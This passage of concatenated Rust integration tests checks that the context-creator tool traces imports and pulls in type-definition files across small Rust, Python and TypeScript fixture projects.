    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("conditional.rs"),
        r#"
#[cfg(target_os = "windows")]
mod windows_specific;

#[cfg(target_os = "linux")]
mod linux_specific;

#[cfg(target_os = "macos")]
mod macos_specific;

#[cfg(feature = "advanced")]
use advanced::features::{Feature1, Feature2};

#[cfg(not(feature = "minimal"))]
pub fn full_version() {
    #[cfg(debug_assertions)]
    println!("Debug mode");
    
    #[cfg(not(debug_assertions))]
    println!("Release mode");
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_something() {
        // Test code
    }
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle conditional compilation
    assert!(output.status.success());
}

/// Test with async/await code
#[test]
fn test_async_await_code() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("async_code.rs"),
        r#"
use std::future::Future;

mod utils;
use utils::async_helper;

pub async fn async_function() -> Result<(), Box<dyn std::error::Error>> {
    async_helper().await?;
    
    // Async block
    let result = async {
        println!("In async block");
        42
    }.await;
    
    Ok(())
}

async fn another_async() {
    async_function().await.unwrap();
}

// Async trait (with async-trait crate syntax)
#[async_trait]
trait AsyncTrait {
    async fn method(&self) -> i32;
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("utils.rs"),
        r#"
pub async fn async_helper() -> Result<(), Box<dyn std::error::Error>> {
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    Ok(())
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle async/await syntax
    assert!(output.status.success());
    assert!(stdout.contains("async_code.rs"));

    // Should track imports in async code
    assert!(stdout.contains("Imports: utils"));
    assert!(stdout.contains("utils.rs") && stdout.contains("Imported by: async_code.rs"));
}

/// Test with generics and trait bounds
#[test]
fn test_complex_generics() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("generics.rs"),
        r#"
use std::fmt::{Debug, Display};
use std::marker::PhantomData;

mod traits;
use traits::{CustomTrait, AnotherTrait};

pub struct Complex<T, U, V>
where
    T: Debug + Display + Send + Sync,
    U: CustomTrait<Item = T> + 'static,
    V: AnotherTrait<T, U>,
{
    t: T,
    u: U,
    v: V,
    _phantom: PhantomData<fn(T) -> U>,
}

impl<T, U, V> Complex<T, U, V>
where
    T: Debug + Display + Send + Sync,
    U: CustomTrait<Item = T> + 'static,
    V: AnotherTrait<T, U>,
{
    pub fn new(t: T, u: U, v: V) -> Self {
        Self {
            t,
            u,
            v,
            _phantom: PhantomData,
        }
    }
}

// Higher-ranked trait bounds
fn higher_ranked<F>(f: F)
where
    F: for<'a> Fn(&'a str) -> &'a str,
{
    let result = f("test");
    println!("{}", result);
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("traits.rs"),
        r#"
pub trait CustomTrait {
    type Item;
    fn process(&self) -> Self::Item;
}

pub trait AnotherTrait<T, U> {
    fn combine(&self, t: T, u: U);
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle complex generics
    assert!(output.status.success());
    assert!(stdout.contains("generics.rs"));
    assert!(stdout.contains("Imports: traits"));
}

/// Test with inline modules
#[test]
fn test_inline_modules() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("inline_mods.rs"),
        r#"
// Inline module definition
mod inner {
    pub fn inner_function() {
        println!("Inner");
    }
    
    pub mod deeper {
        pub fn deeper_function() {
            super::inner_function();
        }
    }
}

mod another {
    use super::inner::{self, deeper};
    
    pub fn use_inner() {
        inner::inner_function();
        deeper::deeper_function();
    }
}

fn main() {
    inner::inner_function();
    inner::deeper::deeper_function();
    another::use_inner();
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle inline modules
    assert!(output.status.success());
}

/// Test with re-exports and glob imports
#[test]
fn test_reexports_and_glob_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("lib.rs"),
        r#"
mod internal;
mod types;

// Re-export everything from internal
pub use internal::*;

// Selective re-exports
pub use types::{Type1, Type2 as RenamedType};

// Glob import in the module
use std::collections::*;

pub fn use_hashmap() -> HashMap<String, i32> {
    let mut map = HashMap::new();
    map.insert("key".to_string(), 42);
    map
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("internal.rs"),
        r#"
pub fn exported_function() {
    println!("This is re-exported");
}

pub struct ExportedStruct {
    pub field: i32,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("types.rs"),
        r#"
pub struct Type1;
pub struct Type2;
pub struct Type3; // Not re-exported
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle re-exports and glob imports
    assert!(output.status.success());
    assert!(stdout.contains("lib.rs"));
    assert!(stdout.contains("Imports: internal, types"));
}

/// Test with empty modules and files
#[test]
fn test_empty_modules() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create empty file
    fs::write(src_dir.join("empty.rs"), "").unwrap();

    // Create file with just module declaration
    fs::write(src_dir.join("just_mod.rs"), "mod empty;\n").unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle empty files
    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("empty.rs"));
    assert!(stdout.contains("just_mod.rs"));
}
```

## tests/semantic_include_types_integration_test.rs

Imports: context_creator, std::fs, tempfile::TempDir, config

Type references: fs, tempfile::TempDir.TempDir, context_creator.Config

```rust
//! Integration test for --include-types using the full processing flow

use context_creator::{run, Config};
use std::fs;
use tempfile::TempDir;

#[test]
fn test_include_types_full_flow() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create main file that uses a type
    fs::write(
        root.join("main.rs"),
        r#"
use types::MyType;

fn main() {
    let x: MyType = MyType::new();
}
"#,
    )
    .unwrap();

    // Create type definition in separate file
    fs::write(
        root.join("types.rs"),
        r#"
pub struct MyType {
    value: i32,
}

impl MyType {
    pub fn new() -> Self {
        Self { value: 42 }
    }
}
"#,
    )
    .unwrap();

    // Create output file path
    let output_file = root.join("output.md");

    // Create config
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["main.rs".to_string()]),
        output_file: Some(output_file.clone()),
        include_types: true,
        semantic_depth: 2,
        progress: false,
        quiet: true,
        ..Default::default()
    };

    // Run the full flow
    run(config).unwrap();

    // Read the output
    let output = fs::read_to_string(&output_file).unwrap();

    // Check that both files are included
    assert!(output.contains("main.rs"), "Output should contain main.rs");
    assert!(
        output.contains("types.rs"),
        "Output should contain types.rs - type definition file should be included"
    );

    // Check that MyType definition is present
    assert!(
        output.contains("struct MyType"),
        "Type definition should be present in output"
    );
}
```

## tests/semantic_include_types_simple_test.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::fs, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator::cli::Config.Config, context_creator::cli::Config.Config

```rust
//! Simple failing test to demonstrate --include-types doesn't expand files yet

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, WalkOptions};
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

#[test]
fn test_include_types_expands_files() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create main file that uses a type
    fs::write(
        root.join("main.rs"),
        r#"
use types::MyType;

fn main() {
    let x: MyType = MyType::new();
}
"#,
    )
    .unwrap();

    // Create type definition in separate file that won't be walked initially
    fs::create_dir(root.join("types")).unwrap();
    fs::write(
        root.join("types.rs"),
        r#"
pub struct MyType {
    value: i32,
}

impl MyType {
    pub fn new() -> Self {
        Self { value: 42 }
    }
}
"#,
    )
    .unwrap();

    // Configure to walk the directory but use include pattern for main.rs only
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["main.rs".to_string()]), // Only include main.rs pattern
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    // Should start with only main.rs
    assert_eq!(files.len(), 1, "Should start with only main.rs");

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Debug: Check if type references were found
    let main_file = &files[0];
    eprintln!("Main file type references: {:?}", main_file.type_references);
    eprintln!("Number of files after semantic analysis: {}", files.len());

    // Convert to HashMap for file expansion
    let mut files_map = std::collections::HashMap::new();
    for file in files {
        files_map.insert(file.path.clone(), file);
    }

    // Perform file expansion
    let expanded_map =
        context_creator::core::file_expander::expand_file_list(files_map, &config, &cache).unwrap();

    // EXPECTED: After expansion with --include-types, should include types.rs
    assert_eq!(
        expanded_map.len(),
        2,
        "Should expand to include type definition file"
    );

    // Verify the type file was added
    let has_type_file = expanded_map
        .values()
        .any(|f| f.relative_path.to_str().unwrap().contains("types.rs"));
    assert!(has_type_file, "types.rs should be included after expansion");
}

#[test]
fn test_include_types_adds_definition_paths() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    fs::write(
        root.join("main.rs"),
        r#"
struct LocalType {
    x: i32,
}

fn main() {
    let t: LocalType = LocalType { x: 1 };
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    let main_file = files
        .iter()
        .find(|f| f.relative_path.to_str().unwrap() == "main.rs")
        .unwrap();

    // Check that type references have definition_path populated
    for type_ref in &main_file.type_references {
        // This will fail because definition_path field doesn't exist yet
        // assert!(type_ref.definition_path.is_some(), "Type {} should have definition_path", type_ref.name);

        // For now just check we detected the type
        assert_eq!(type_ref.name, "LocalType");
    }
}
```

## tests/semantic_include_types_test.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::collections::HashMap, std::fs, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator.FileInfo, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, context_creator.FileInfo, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, _, _, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config

```rust
//! Integration tests for --include-types functionality
//! These tests verify that type definition files are included when using --include-types flag

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, FileInfo, WalkOptions};
use std::collections::HashMap;
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

/// Helper function to perform semantic analysis and file expansion
fn analyze_and_expand(
    mut files: Vec<FileInfo>,
    config: &Config,
    cache: &Arc<FileCache>,
) -> Vec<FileInfo> {
    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, config, cache).unwrap();

    // Convert to HashMap for file expansion
    let mut files_map = HashMap::new();
    for file in files {
        files_map.insert(file.path.clone(), file);
    }

    // Perform file expansion
    let expanded_map =
        context_creator::core::file_expander::expand_file_list(files_map, config, cache).unwrap();

    // Convert back to Vec
    expanded_map.into_values().collect()
}

#[test]
fn test_basic_type_inclusion() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a simple Rust project with type usage
    fs::write(
        root.join("main.rs"),
        r#"
use types::UserAccount;
use types::DatabaseConfig;

fn main() {
    let user: UserAccount = UserAccount::new("Alice");
    let config: DatabaseConfig = DatabaseConfig::default();
}
"#,
    )
    .unwrap();

    // Create type definitions in separate file
    fs::create_dir(root.join("types")).unwrap();
    fs::write(
        root.join("types/mod.rs"),
        r#"
pub struct UserAccount {
    name: String,
}

impl UserAccount {
    pub fn new(name: &str) -> Self {
        Self { name: name.to_string() }
    }
}

pub struct DatabaseConfig {
    host: String,
    port: u16,
}

impl Default for DatabaseConfig {
    fn default() -> Self {
        Self { 
            host: "localhost".to_string(),
            port: 5432,
        }
    }
}
"#,
    )
    .unwrap();

    // Create config with include_types enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        trace_imports: false,
        include_callers: false,
        semantic_depth: 2,
        ..Config::default()
    };

    // Walk directory and perform semantic analysis
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    // Initially should have main.rs and types/mod.rs
    assert_eq!(files.len(), 2, "Should start with main.rs and types/mod.rs");

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // After semantic analysis, check if type references were detected
    let main_file = files
        .iter()
        .find(|f| f.relative_path.to_str().unwrap() == "main.rs")
        .unwrap();
    assert!(
        !main_file.type_references.is_empty(),
        "Should detect type references"
    );

    // This should fail - we expect file expansion to happen but it's not implemented yet
    // When implemented, this should expand to include files that define the referenced types
    let expected_with_expansion = 2; // Should stay 2 since types/mod.rs is already included
    assert_eq!(
        files.len(),
        expected_with_expansion,
        "Should include type definition files"
    );
}

#[test]
fn test_cross_directory_type_resolution() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a more complex directory structure
    fs::create_dir_all(root.join("src/models")).unwrap();
    fs::create_dir_all(root.join("src/handlers")).unwrap();
    fs::create_dir_all(root.join("shared/types")).unwrap();

    // Handler using types from different directories
    fs::write(
        root.join("src/handlers/user_handler.rs"),
        r#"
use crate::models::User;
use shared::types::ApiResponse;

pub fn handle_user_request(user_id: u32) -> ApiResponse<User> {
    let user = User::find(user_id);
    ApiResponse::ok(user)
}
"#,
    )
    .unwrap();

    // Model definition
    fs::write(
        root.join("src/models/user.rs"),
        r#"
pub struct User {
    pub id: u32,
    pub name: String,
}

impl User {
    pub fn find(id: u32) -> Self {
        Self { id, name: "Test User".to_string() }
    }
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("src/models/mod.rs"),
        r#"
mod user;
pub use user::User;
"#,
    )
    .unwrap();

    // Shared type definition
    fs::write(
        root.join("shared/types/mod.rs"),
        r#"
pub struct ApiResponse<T> {
    pub data: T,
    pub status: u16,
}

impl<T> ApiResponse<T> {
    pub fn ok(data: T) -> Self {
        Self { data, status: 200 }
    }
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["**/user_handler.rs".to_string()]), // Only include the handler initially
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let files = walk_directory(root, walk_options).unwrap();

    let initial_count = files.len();
    let expanded_files = analyze_and_expand(files, &config, &cache);

    // Should include both type definition files
    assert!(
        expanded_files.len() > initial_count,
        "Should include type definition files"
    );

    // Verify specific files are included (platform-agnostic path checking)
    let has_user_model = expanded_files.iter().any(|f| {
        let path_str = f.relative_path.to_str().unwrap();
        path_str.contains("models") && path_str.contains("user.rs")
    });
    let has_api_response = expanded_files.iter().any(|f| {
        let path_str = f.relative_path.to_str().unwrap();
        path_str.contains("shared") && path_str.contains("types") && path_str.contains("mod.rs")
    });

    assert!(has_user_model, "User model file should be included");
    assert!(has_api_response, "ApiResponse type file should be included");
}

#[test]
fn test_circular_type_dependencies() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create circular type dependencies: A uses B, B uses A
    fs::write(
        root.join("type_a.rs"),
        r#"
use crate::type_b::TypeB;

pub struct TypeA {
    pub b_ref: Option<TypeB>,
}

impl TypeA {
    pub fn new() -> Self {
        Self { b_ref: None }
    }
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("type_b.rs"),
        r#"
use crate::type_a::TypeA;

pub struct TypeB {
    pub a_ref: Option<Box<TypeA>>,
}

impl TypeB {
    pub fn new() -> Self {
        Self { a_ref: None }
    }
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("main.rs"),
        r#"
mod type_a;
mod type_b;

use type_a::TypeA;

fn main() {
    let a = TypeA::new();
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Should handle circular dependencies without infinite loop
    // All files should be included exactly once
    assert_eq!(
        files.len(),
        3,
        "Should include all 3 files without duplication"
    );

    // Verify no duplicate paths
    let paths: Vec<_> = files.iter().map(|f| &f.relative_path).collect();
    let unique_paths: std::collections::HashSet<_> = paths.iter().collect();
    assert_eq!(
        paths.len(),
        unique_paths.len(),
        "No duplicate files should be included"
    );
}

#[test]
fn test_external_type_handling() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a Rust file using both local and external types
    fs::write(
        root.join("main.rs"),
        r#"
use std::collections::HashMap;
use serde::{Serialize, Deserialize};
use local_types::MyConfig;

#[derive(Serialize, Deserialize)]
struct AppState {
    config: MyConfig,
    cache: HashMap<String, String>,
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("local_types.rs"),
        r#"
pub struct MyConfig {
    pub name: String,
    pub value: i32,
}
"#,
    )
    .unwrap();

    // Create a Cargo.toml to identify external dependencies
    fs::write(
        root.join("Cargo.toml"),
        r#"
[package]
name = "test-app"
version = "0.1.0"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Should include local type file
    let has_local_types = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap().contains("local_types.rs"));
    assert!(has_local_types, "Local type definitions should be included");

    // Find main.rs and check its type references
    let main_file = files
        .iter()
        .find(|f| f.relative_path.to_str().unwrap() == "main.rs")
        .unwrap();

    // Should have external types marked as such
    // TODO: Uncomment when is_external field is added to TypeReference
    // let external_types: Vec<_> = main_file.type_references.iter()
    //     .filter(|tr| tr.is_external)
    //     .collect();

    // assert!(!external_types.is_empty(), "Should identify external types");

    // HashMap should be marked as external from std
    // TODO: Uncomment when external_package field is added
    // let has_hashmap = external_types.iter().any(|tr| tr.name == "HashMap" && tr.external_package.as_ref().map(|p| p.contains("std")).unwrap_or(false));
    // assert!(has_hashmap, "HashMap should be marked as external from std");

    // For now, just check that we have type references
    assert!(
        !main_file.type_references.is_empty(),
        "Should have type references detected"
    );
}

#[test]
fn test_token_limit_respect() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create many type files to test token limit handling
    for i in 0..10 {
        fs::write(
            root.join(format!("type_{i}.rs")),
            format!(
                r#"
pub struct Type{i} {{
    pub id: u32,
    pub data: String,
    // Adding some content to increase file size
    pub field1: String,
    pub field2: String,
    pub field3: String,
    pub field4: String,
}}

impl Type{i} {{
    pub fn new() -> Self {{
        Self {{
            id: {i},
            data: "test".to_string(),
            field1: "test".to_string(),
            field2: "test".to_string(),
            field3: "test".to_string(),
            field4: "test".to_string(),
        }}
    }}
}}
"#
            ),
        )
        .unwrap();
    }

    // Create main file that uses all types
    let mut type_uses = String::new();
    for i in 0..10 {
        type_uses.push_str(&format!("use crate::type_{i}::Type{i};\n"));
    }

    let mut type_usage = String::new();
    for i in 0..10 {
        type_usage.push_str(&format!("    let t{i} = Type{i}::new();\n"));
    }

    fs::write(
        root.join("main.rs"),
        format!(
            r#"
{type_uses}

fn main() {{
{type_usage}
}}
"#
        ),
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        max_tokens: Some(1000), // Set a low token limit
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let files = walk_directory(root, walk_options).unwrap();

    let expanded_files = analyze_and_expand(files, &config, &cache);

    // Should respect token limit and not include all type files
    // This behavior depends on prioritization
    // Note: File expansion happens before prioritization, so we might have all files
    // but the final output would be limited by token count
    assert!(
        expanded_files.len() <= 11,
        "Should have at most 11 files (main + 10 types)"
    );

    // Main.rs should always be included as it's the entry point
    let has_main = expanded_files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "main.rs");
    assert!(has_main, "Main file should always be included");
}

#[test]
fn test_type_alias_chains() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a chain of type aliases
    fs::write(
        root.join("types.rs"),
        r#"
pub type UserId = u32;
pub type CustomerId = UserId;
pub type AdminId = CustomerId;

pub struct User {
    pub id: UserId,
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("main.rs"),
        r#"
use types::{AdminId, User};

fn main() {
    let admin_id: AdminId = 42;
    let user = User { id: admin_id };
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Should include types.rs as it contains the type definitions
    let has_types_file = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "types.rs");
    assert!(
        has_types_file,
        "types.rs should be included for type alias definitions"
    );
}

#[test]
fn test_trait_definitions_only() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create trait definition
    fs::write(
        root.join("traits.rs"),
        r#"
pub trait Repository<T> {
    fn find(&self, id: u32) -> Option<T>;
    fn save(&mut self, item: T) -> Result<(), String>;
}
"#,
    )
    .unwrap();

    // Create multiple implementations
    fs::write(
        root.join("user_repo.rs"),
        r#"
use crate::traits::Repository;

pub struct UserRepository;

impl Repository<User> for UserRepository {
    fn find(&self, id: u32) -> Option<User> {
        Some(User { id, name: "Test".into() })
    }
    
    fn save(&mut self, item: User) -> Result<(), String> {
        Ok(())
    }
}

pub struct User {
    pub id: u32,
    pub name: String,
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("product_repo.rs"),
        r#"
use crate::traits::Repository;

pub struct ProductRepository;

impl Repository<Product> for ProductRepository {
    fn find(&self, id: u32) -> Option<Product> {
        Some(Product { id, name: "Test Product".into() })
    }
    
    fn save(&mut self, item: Product) -> Result<(), String> {
        Ok(())
    }
}

pub struct Product {
    pub id: u32,
    pub name: String,
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("main.rs"),
        r#"
mod traits;
mod user_repo;
mod product_repo;

use traits::Repository;
use user_repo::UserRepository;

fn main() {
    let repo = UserRepository;
    let _user = repo.find(1);
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["main.rs".to_string()]), // Only include main.rs initially
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let files = walk_directory(root, walk_options).unwrap();

    let expanded_files = analyze_and_expand(files, &config, &cache);

    // Should include trait definition
    let has_trait_def = expanded_files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "traits.rs");
    assert!(has_trait_def, "Trait definition file should be included");

    // Should include UserRepository since it's directly used
    let has_user_repo = expanded_files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "user_repo.rs");
    assert!(
        has_user_repo,
        "User repository should be included as it's used"
    );

    // Should NOT include ProductRepository as it's not used
    let has_product_repo = expanded_files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "product_repo.rs");
    assert!(
        !has_product_repo,
        "Product repository should not be included as it's not used"
    );
}

#[test]
fn test_generic_type_parameters() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    fs::write(
        root.join("generics.rs"),
        r#"
pub struct Container<T> {
    pub value: T,
}

pub struct Pair<K, V> {
    pub key: K,
    pub value: V,
}

pub enum Result<T, E> {
    Ok(T),
    Err(E),
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("custom_types.rs"),
        r#"
pub struct MyData {
    pub id: u32,
}

pub struct MyError {
    pub message: String,
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("main.rs"),
        r#"
use generics::{Container, Result};
use custom_types::{MyData, MyError};

fn main() {
    let container: Container<MyData> = Container { value: MyData { id: 1 } };
    let result: Result<MyData, MyError> = Result::Ok(MyData { id: 2 });
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Should include both generic type definitions and the concrete types used
    let has_generics = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "generics.rs");
    let has_custom_types = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "custom_types.rs");

    assert!(has_generics, "Generic type definitions should be included");
    assert!(
        has_custom_types,
        "Custom types used as generic parameters should be included"
    );
}

#[test]
fn test_multiple_language_types() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create Python file with type annotations
    fs::write(
        root.join("app.py"),
        r#"
from typing import List, Optional
from models import User, Product

def get_users() -> List[User]:
    return [User(id=1, name="Alice")]

def find_product(id: int) -> Optional[Product]:
    return Product(id=id, price=99.99)
"#,
    )
    .unwrap();

    fs::write(
        root.join("models.py"),
        r#"
class User:
    def __init__(self, id: int, name: str):
        self.id = id
        self.name = name

class Product:
    def __init__(self, id: int, price: float):
        self.id = id
        self.price = price
"#,
    )
    .unwrap();

    // Create TypeScript file
    fs::write(
        root.join("api.ts"),
        r#"
import { ApiResponse, ErrorResponse } from './types';
import { User } from './models';

async function fetchUser(id: number): Promise<ApiResponse<User>> {
    const user = new User(id, "Test");
    return { data: user, status: 200 };
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("types.ts"),
        r#"
export interface ApiResponse<T> {
    data: T;
    status: number;
}

export interface ErrorResponse {
    error: string;
    code: number;
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("models.ts"),
        r#"
export class User {
    constructor(public id: number, public name: string) {}
}
"#,
    )
    .unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Should include type definition files for both languages
    let has_python_models = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "models.py");
    let has_ts_types = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "types.ts");
    let has_ts_models = files
        .iter()
        .any(|f| f.relative_path.to_str().unwrap() == "models.ts");

    assert!(
        has_python_models,
        "Python model definitions should be included"
    );
    assert!(
        has_ts_types,
        "TypeScript type definitions should be included"
    );
    assert!(
        has_ts_models,
        "TypeScript model definitions should be included"
    );
}
```

## tests/semantic_markdown_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Test specifically for semantic information in markdown output

use std::fs;
use tempfile::TempDir;

#[test]
fn test_semantic_imports_shown_in_markdown() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a simple module structure
    fs::write(
        src_dir.join("main.rs"),
        r#"mod lib;
